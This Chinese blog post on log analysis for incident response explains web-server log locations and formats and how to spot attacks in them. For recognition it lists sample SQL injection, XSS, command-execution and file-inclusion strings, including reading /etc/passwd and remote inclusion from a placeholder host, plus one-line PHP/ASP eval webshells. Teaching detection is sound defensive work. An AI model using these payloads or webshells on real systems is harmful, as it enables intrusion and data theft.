    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="应急响应" scheme="https://jiangjiyue.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="日志分析" scheme="https://jiangjiyue.github.io/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>应急响应之日志分析</title>
    <link href="https://jiangjiyue.github.io/2024/07/06/9e820566/"/>
    <id>https://jiangjiyue.github.io/2024/07/06/9e820566/</id>
    <published>2024-07-06T10:34:49.000Z</published>
    <updated>2024-10-22T12:39:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 22.95K </p>    </div>    <div class="cell" style="">    <p>代码: 16.42K, 文本: 2.07K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 1.34 小时</p>    </div>    </div>    <div class="tag-plugin video" style="aspect-ratio:1.7777777777777777;max-width:100%;">    <iframe src="https://player.bilibili.com/player.html?bvid=BV19vyWYGELf&autoplay=false" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true">    </iframe>    </div>    <a class="tag-plugin colorful button" color="theme" title="工具and日志" href="https://security-1258894728.cos.ap-beijing.myqcloud.com/%E5%B7%A5%E5%85%B7and%E6%97%A5%E5%BF%97.zip"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg><span>工具and日志</span></a><h2 id="攻击容易出现的位置"><a href="#攻击容易出现的位置" class="headerlink" title="攻击容易出现的位置"></a>攻击容易出现的位置</h2><ul><li>GET、POST请求报文的url字段</li><li>GET、POST请求报文的cookie字段</li><li>GET、POST请求报文的reffer字段</li><li>GET、POST请求报文的user-agent字段</li><li>POST请求报文的表单字段</li></ul><h2 id="常见攻击语句"><a href="#常见攻击语句" class="headerlink" title="常见攻击语句"></a>常见攻击语句</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><ul><li>探测语句<ul><li><code>http://xxx/news.php?id=23%20and%201=1</code></li><li><code>http://xxx/news.php?id=23%20and%201=2</code></li><li><code>http://xxx/news.php?id=23</code></li></ul></li><li>查询语句<ul><li><code>and exists(select * from admin)</code></li><li><code>and+(select+top+1+asc(mid(username,2,1))+from+Admin)&gt;100</code></li><li><code>union select 1,2,table_name from information_schema.tables where table_schema=database()#</code></li><li><code>union select user,2,password from users#</code></li></ul></li></ul><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul><li><code>&lt;script&gt;alert(/xss/);&lt;/script&gt;</code></li><li><code>&lt;a href=javascript:alert(&#39;test&#39;)&gt;adfasdfasdf&lt;/a&gt;</code></li><li><code>&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</code></li><li><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(/xss/)&quot;/&gt;</code></li></ul><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><ul><li><code>GET /xx/xx/index.php?do=phpinfo</code></li><li><code>GET /x.php?id=/winnt/system32/cmd.exe?/c+dir+c:%5c</code></li><li><code>GET /cgi/ptcmd.cgi?cmd=;cat+/tmp/user.ini</code></li></ul><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><ul><li><code>GET /xx/xx.php?file=../../etc/passwd</code></li><li><code>GET /xx/xx.php?file=http://xx/1.php</code></li><li><code>php://filter/read=convert.base64-encode/resource=index.php</code></li></ul><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><ul><li><code>&lt;?php @eval($_POST[&#39;v&#39;]);?&gt;</code></li><li><code>&lt;%eval request(&quot;v&quot;)%&gt;</code></li><li><code>&lt;%execute(request(&quot;admin&quot;))%&gt;</code></li></ul><h2 id="常见日志"><a href="#常见日志" class="headerlink" title="常见日志"></a>常见日志</h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><ol><li><code>%SystemDrive%\inetpub\logs\LogFiles\</code></li><li><code>%SystemRoot%\system32\LogFiles\W3SVC1</code></li><li><code>%SystemDrive%\inetpub\LogFiles\W3SVC1</code></li><li><code>%SystemDrive%\Windows\System32\LogFiles\HTTPERR</code></li><li><code>%systemroot%\system32\logfiles\MSFTPSVC1\</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 日志格式</span></span><br><span class="line"><span class="comment">#Software: Microsoft Internet Information Services 7.5</span></span><br><span class="line"><span class="comment">#Version: 1.0</span></span><br><span class="line"><span class="comment">#Date: 2013-08-21 01:00:00</span></span><br><span class="line"><span class="comment">#Fields: date time s-sitename s-computername s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs-version cs(User-Agent) cs(Cookie) cs(Referer) cs-host sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># date：日期，记录请求发生的日期和时间。</span></span><br><span class="line"><span class="comment"># time：时间，记录请求发生的具体时间。</span></span><br><span class="line"><span class="comment"># s-sitename：网站名称，表示接收请求的站点的名称。</span></span><br><span class="line"><span class="comment"># s-computername：计算机名称，指示接收请求的服务器的名称或标识符。</span></span><br><span class="line"><span class="comment"># s-ip：服务器IP地址，表示接收请求的服务器的IP地址。</span></span><br><span class="line"><span class="comment"># cs-method：客户端请求方法，指示客户端使用的HTTP请求方法（如GET、POST等）。</span></span><br><span class="line"><span class="comment"># cs-uri-stem：URI路径，指示请求的页面或资源的路径部分。</span></span><br><span class="line"><span class="comment"># cs-uri-query：URI查询字符串，包含附加到请求的查询参数。</span></span><br><span class="line"><span class="comment"># s-port：服务器端口，表示接收请求的服务器的端口号。</span></span><br><span class="line"><span class="comment"># cs-username：客户端用户名，如果客户端进行身份验证，则表示进行身份验证的用户名。</span></span><br><span class="line"><span class="comment"># c-ip：客户端IP地址，表示发出请求的客户端的IP地址。</span></span><br><span class="line"><span class="comment"># cs-version：客户端协议版本，指示客户端使用的HTTP协议版本。</span></span><br><span class="line"><span class="comment"># cs(User-Agent)：客户端User-Agent，表示客户端使用的浏览器或其他用户代理的标识符。</span></span><br><span class="line"><span class="comment"># cs(Cookie)：客户端Cookie，表示客户端发送的包含Cookie信息的请求头。</span></span><br><span class="line"><span class="comment"># cs(Referer)：引用页面，表示引导客户端到当前页面的来源页面。</span></span><br><span class="line"><span class="comment"># cs-host：主机名，表示服务器接收请求的主机名。</span></span><br><span class="line"><span class="comment"># sc-status：状态码，指示服务器响应的HTTP状态码。</span></span><br><span class="line"><span class="comment"># sc-substatus：子状态码，进一步细化HTTP状态码的信息。</span></span><br><span class="line"><span class="comment"># sc-win32-status：Windows状态码，指示底层操作系统返回的错误或状态代码。</span></span><br><span class="line"><span class="comment"># sc-bytes：发送字节数，表示服务器发送给客户端的响应字节数。</span></span><br><span class="line"><span class="comment"># cs-bytes：接收字节数，表示客户端发送给服务器的请求字节数。</span></span><br><span class="line"><span class="comment"># time-taken：处理时间，表示服务器处理请求所花费的时间，以毫秒为单位。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># W3SVC1026760001---&gt;ex170818.log</span></span><br><span class="line">2017-08-18 13:37:42 W3SVC1026760001 127.0.0.1 GET /sql1.php - 8009 - 127.0.0.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.2;+SV1;+.NET+CLR+1.1.4322;+.NET+CLR+2.0.50727) 500 0 0</span><br><span class="line">2017-08-18 13:38:18 W3SVC1026760001 192.168.0.200 GET / - 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 200 0 0</span><br><span class="line">2017-08-18 13:38:19 W3SVC1026760001 192.168.0.200 GET /sql1.php - 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 500 0 0</span><br><span class="line">2017-08-18 13:38:23 W3SVC1026760001 192.168.0.200 GET /sql1.php <span class="built_in">id</span>=1 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 500 0 0</span><br><span class="line">2017-08-18 13:38:38 W3SVC1026760001 192.168.0.200 GET /sql1.php <span class="built_in">id</span>=1 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 200 0 0</span><br><span class="line">2017-08-18 13:38:41 W3SVC1026760001 192.168.0.200 GET /sql1.php <span class="built_in">id</span>=1 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 200 0 0</span><br><span class="line">2017-08-18 13:38:43 W3SVC1026760001 192.168.0.200 GET /sql1.php <span class="built_in">id</span>=1%20and%201=1 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 500 0 0</span><br><span class="line">2017-08-18 13:39:01 W3SVC1026760001 192.168.0.200 GET /sql1.php <span class="built_in">id</span>=1%20and%201=1 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 200 0 0</span><br><span class="line">2017-08-18 13:39:32 W3SVC1026760001 192.168.0.200 GET /sql2.php <span class="built_in">id</span>=1 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 500 0 0</span><br><span class="line">2017-08-18 13:40:36 W3SVC1026760001 192.168.0.200 GET /sql2.php <span class="built_in">id</span>=1 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 500 0 0</span><br><span class="line">2017-08-18 13:40:36 W3SVC1026760001 192.168.0.200 GET /sql2.php <span class="built_in">id</span>=1 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 500 0 0</span><br><span class="line">2017-08-18 13:40:37 W3SVC1026760001 192.168.0.200 GET /sql2.php <span class="built_in">id</span>=1 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 500 0 0</span><br><span class="line">2017-08-18 13:41:59 W3SVC1026760001 192.168.0.200 GET /sql2.php <span class="built_in">id</span>=1 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 500 0 0</span><br><span class="line">2017-08-18 13:42:21 W3SVC1026760001 192.168.0.200 GET /sql2.php <span class="built_in">id</span>=1 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 200 0 0</span><br><span class="line">2017-08-18 13:42:25 W3SVC1026760001 192.168.0.200 GET /sql2.php <span class="built_in">id</span>=1%20and%201=1 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 200 0 0</span><br><span class="line">2017-08-18 13:42:29 W3SVC1026760001 192.168.0.200 GET /sql2.php <span class="built_in">id</span>=1%20and%201=2 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 200 0 0</span><br><span class="line">2017-08-18 13:43:13 W3SVC1026760001 192.168.0.200 GET /sql2.php <span class="built_in">id</span>=1%20and%201=2 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 200 0 0</span><br><span class="line">2017-08-18 13:43:13 W3SVC1026760001 192.168.0.200 GET /sql2.php <span class="built_in">id</span>=1%20and%201=2 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 200 0 0</span><br><span class="line">2017-08-18 13:43:13 W3SVC1026760001 192.168.0.200 GET /sql2.php <span class="built_in">id</span>=1%20and%201=2 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 200 0 0</span><br><span class="line">2017-08-18 13:43:14 W3SVC1026760001 192.168.0.200 GET /sql2.php <span class="built_in">id</span>=1%20and%201=2 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 200 0 0</span><br><span class="line">2017-08-18 13:43:14 W3SVC1026760001 192.168.0.200 GET /sql2.php <span class="built_in">id</span>=1%20and%201=2 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 200 0 0</span><br><span class="line">2017-08-18 13:43:14 W3SV1026760001 192.168.0.200 GET /sql2.php <span class="built_in">id</span>=1%20and%201=2 8009 - 192.168.0.111 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/49.0.2623.221+Safari/537.36+SE+2.X+MetaSr+1.0 200 0 0</span><br></pre></td></tr></table></figure><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><ol><li><code>/var/log/httpd/access.log</code></li><li><code>/var/log/apache/access.log</code></li><li><code>/var/log/apache2/access.log</code></li><li><code>/var/log/httpd-access.log</code></li><li><code>windows：&lt;Apache安装目录&gt;\logs\access.log | error.log</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">10.11.35.94 - - [30/Sep/2019:08:53:33 +0800] <span class="string">&quot;GET /index.php?action=view&amp;mod=chgavatar HTTP/1.1&quot;</span> 302 357 <span class="string">&quot;http://10.20.124.219/index.php?action=view&amp;mod=percenter&quot;</span> <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&quot;</span></span><br><span class="line"></span><br><span class="line">1. 10.11.35.94 - 访问者的IP地址。这是发起请求的客户端的IP地址。</span><br><span class="line">2. - - 用户标识符（通常未使用，表示为-）。</span><br><span class="line">3. - - 用户认证标识符（通常未使用，表示为-）。</span><br><span class="line">4. [30/Sep/2019:08:53:33 +0800] - 请求的时间戳，表示请求的日期和时间。格式为[day/month/year:hour:minute:second timezone]。</span><br><span class="line">5. <span class="string">&quot;GET /index.php?action=view&amp;mod=chgavatar HTTP/1.1&quot;</span> - 实际的HTTP请求行，包括请求方法（GET）、请求的URL路径（/index.php?action=view&amp;mod=chgavatar）、和HTTP协议版本（HTTP/1.1）。</span><br><span class="line">6. 302 - HTTP状态码，表示服务器对请求的响应状态。302表示重定向。</span><br><span class="line">7. 357 - 响应的字节数，表示服务器返回内容的大小。</span><br><span class="line">8. <span class="string">&quot;http://10.20.124.219/index.php?action=view&amp;mod=percenter&quot;</span> - 引用页面（Referer），表示发起请求的来源页面。</span><br><span class="line">9. <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&quot;</span> - 用户代理字符串，表示发起请求的客户端软件的信息（比如操作系统和浏览器版本）。</span><br></pre></td></tr></table></figure><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><ol><li><code>/usr/local/nginx/logs</code><ul><li><code>access.log</code>代表访问日志</li><li><code>error.log</code>代表错误日志</li></ul></li><li><code>/var/log/nginx/error.log</code></li><li><code>/var/log/nginx/access.log</code></li></ol><p>同<code>Apache</code>,通常情况下Nginx可自定义为以下格式</p><figure class="highlight bash"><figcaption><span>nginx.conf</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改日志模式</span></span><br><span class="line"> <span class="comment"># json 为规则名字 escape=json 设置日志文件格式为json</span></span><br><span class="line">     log_format json escape=json <span class="string">&#x27;&#123;&quot;@timestamp&quot;:&quot;$time_iso8601&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;domain&quot;:&quot;$host&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;host&quot;:&quot;$server_addr&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;clientip&quot;:&quot;$remote_addr&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;remote_user&quot;:&quot;$remote_user&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;request&quot;:&quot;$request&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;request_method&quot;:&quot;$request_method&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;uri&quot;:&quot;$uri&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;request_time&quot;:&quot;$request_time&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;status&quot;:&quot;$status&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;http_referrer&quot;:&quot;$http_referer&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;body_bytes_sent&quot;:&quot;$body_bytes_sent&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;xff&quot;:&quot;$http_x_forwarded_for&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;http_user_agent&quot;:&quot;$http_user_agent&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;upstream_addr&quot;:&quot;$upstream_addr&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;upstream_response_time&quot;:&quot;$upstream_response_time&quot;&#125;&#x27;</span>;</span><br><span class="line"> <span class="comment"># 将上方的规则名称写到最后</span></span><br><span class="line"> access_log /var/log/nginx/access.log json;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;@timestamp&quot;: &quot;$time_iso8601&quot; - 请求的时间戳，使用ISO 8601格式表示。</span></span><br><span class="line"><span class="comment">#  &quot;domain&quot;: &quot;$host&quot; - 请求的域名，即客户端请求的主机名。</span></span><br><span class="line"><span class="comment">#  &quot;host&quot;: &quot;$server_addr&quot; - 服务器的IP地址。</span></span><br><span class="line"><span class="comment">#  &quot;clientip&quot;: &quot;$remote_addr&quot; - 客户端的IP地址，即发起请求的客户端的IP地址。</span></span><br><span class="line"><span class="comment">#  &quot;remote_user&quot;: &quot;$remote_user&quot; - 已经验证的远程用户，如果没有则为空。</span></span><br><span class="line"><span class="comment">#  &quot;request&quot;: &quot;$request&quot; - 请求行，包含请求方法、请求的URI和HTTP版本。</span></span><br><span class="line"><span class="comment">#  &quot;request_method&quot;: &quot;$request_method&quot; - 请求方法，例如GET、POST等。</span></span><br><span class="line"><span class="comment">#  &quot;uri&quot;: &quot;$uri&quot; - 请求的URI（不包含查询字符串）。</span></span><br><span class="line"><span class="comment">#  &quot;request_time&quot;: &quot;$request_time&quot; - 请求的处理时间，单位是秒，记录从接收到完整请求到发送响应的时间。</span></span><br><span class="line"><span class="comment">#  &quot;status&quot;: &quot;$status&quot; - HTTP状态码，表示服务器对请求的响应状态。</span></span><br><span class="line"><span class="comment">#  &quot;http_referrer&quot;: &quot;$http_referer&quot; - 引用页面（Referer），表示发起请求的来源页面。</span></span><br><span class="line"><span class="comment">#  &quot;body_bytes_sent&quot;: &quot;$body_bytes_sent&quot; - 发送给客户端的响应字节数，不包括响应头的大小。</span></span><br><span class="line"><span class="comment">#  &quot;xff&quot;: &quot;$http_x_forwarded_for&quot; - X-Forwarded-For头的值，通常用于记录代理服务器或负载均衡之前的客户端IP地址。</span></span><br><span class="line"><span class="comment">#  &quot;http_user_agent&quot;: &quot;$http_user_agent&quot; - 用户代理字符串，表示发起请求的客户端软件的信息（比如操作系统和浏览器版本）。</span></span><br><span class="line"><span class="comment">#  &quot;upstream_addr&quot;: &quot;$upstream_addr&quot; - 上游服务器的地址，如果请求被代理到其他服务器，这里记录上游服务器的IP地址。</span></span><br><span class="line"><span class="comment">#  &quot;upstream_response_time&quot;: &quot;$upstream_response_time&quot; - 上游服务器的响应时间，单位是秒，记录从Nginx向上游服务器发起请求到收到完整响应的时间。</span></span><br></pre></td></tr></table></figure><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><ol><li><p>默认在<code>Tomcat_HOME/logs/</code></p></li><li><p><code>/usr/local/tomcat/logs/</code></p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在tomcat/conf下的server.xml中 配置如下:</span></span><br><span class="line">&lt;Valve className=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span>  </span><br><span class="line">directory=<span class="string">&quot;logs&quot;</span> prefix=<span class="string">&quot;localhost_access_log.&quot;</span> suffix=<span class="string">&quot;.txt&quot;</span> pattern=<span class="string">&quot;%h %l %u %t &quot;</span>%r<span class="string">&quot; %s %b&quot;</span> /&gt;</span><br><span class="line"><span class="comment"># 日志格式说明:</span></span><br><span class="line"><span class="comment"># %h 远程的主机名或IP</span></span><br><span class="line"><span class="comment"># %l 远程的逻辑用户名</span></span><br><span class="line"><span class="comment"># %u 通过身份验证的远程用户</span></span><br><span class="line"><span class="comment"># %t 通用日志格式的日期和时间</span></span><br><span class="line"><span class="comment"># %r 请求</span></span><br><span class="line"><span class="comment"># %s 返回的HTTP状态码</span></span><br><span class="line"><span class="comment"># %b 响应中发送的字节，不包括HTTP头</span></span><br><span class="line"></span><br><span class="line">192.168.1.1 - john [31/Oct/2023:14:20:15 +0800] <span class="string">&quot;GET /index.php?id=1&#x27; and 1=2 union select 1,2,3 from infomation_schmea.tables where table_schmea=database()&#x27; HTTP/1.1&quot;</span> 200 1234</span><br></pre></td></tr></table></figure><h3 id="Vsftp"><a href="#Vsftp" class="headerlink" title="Vsftp"></a>Vsftp</h3><ol><li>统一存放在<code>/var/log/message</code></li><li>可通过编辑<code>/etc/vsftp/vsftp.conf</code>配置文件修改日志位置</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">(000131) 2024/2/29 12:44:49 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; USER admin</span><br><span class="line">(000131) 2024/2/29 12:44:49 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 331 Password required <span class="keyword">for</span> admin</span><br><span class="line">(000133) 2024/2/29 12:44:49 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; USER admin</span><br><span class="line">(000133) 2024/2/29 12:44:49 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 331 Password required <span class="keyword">for</span> admin</span><br><span class="line">(000135) 2024/2/29 12:44:49 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; USER admin</span><br><span class="line">(000135) 2024/2/29 12:44:49 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 331 